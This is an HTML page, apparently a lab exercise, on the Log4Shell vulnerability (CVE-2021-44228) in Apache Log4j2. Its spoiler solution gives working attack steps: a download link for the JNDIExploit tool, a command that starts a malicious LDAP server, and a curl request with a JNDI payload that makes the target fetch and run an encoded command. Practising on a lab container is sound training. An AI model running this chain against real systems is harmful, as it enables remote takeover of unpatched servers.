<h2>Description</h2>
<p>Also known as CVE-2021-44228, log4shell is a zero-day software vulnerability in Apache Log4j2, a popular Java library used for logging purposes in applications.</p>
<p>This vulnerability enables a remote attacker to take control of a device on the internet if the device is running certain unpatched versions of Log4j2.</p>
<p>In December 2021, Apache had to release up to 4 corrective patches to fully close the breach. It is believed that malicious actors likely knew about the vulnerability and exploited it before experts did, hence why it is considered zero-day.</p>

<h2>Goal</h2>
<p>With the help of JNDI lookups, perform admin privilege actions upon the system (main container).</p>

<h2>Solution</h2>
<details>
    <summary>Spoilers! (click to expand)</summary>
    <p>1. Download the JNDIExploit from that link -> https://tinyurl.com/yp2n78js then extract it in a dedicated folder.</p>
    <p>2. Launch a malicious LDAP server using the command \n\"java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888\"</p>
    <p>3. Trigger the exploit using the command: curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'</p>
    <p>4. Go to Containers, open the main container shell and check for the presence of the pwned file by doing ls /tmp</p>
</details>
